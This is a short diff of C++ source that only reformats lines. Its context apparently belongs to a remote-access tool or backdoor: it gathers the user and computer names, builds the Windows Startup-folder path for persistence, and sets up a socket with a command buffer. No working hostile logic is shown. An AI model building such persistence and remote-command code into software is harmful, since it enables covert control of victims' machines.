@@ -15,10 +15,10 @@ std::string username = getenv("username");
 std::string computer = getenv("computername");
 std::string appdata = getenv("appdata");
 std::string command, data;
+
 std::string fileName = "";
 std::string firstPath = "";
-std::string startupPath = "C:/Users/" + username +
-    "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";
+std::string startupPath = "C:/Users/" + username + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";
 
 SOCKET objSocket;
 char buffer[8192];
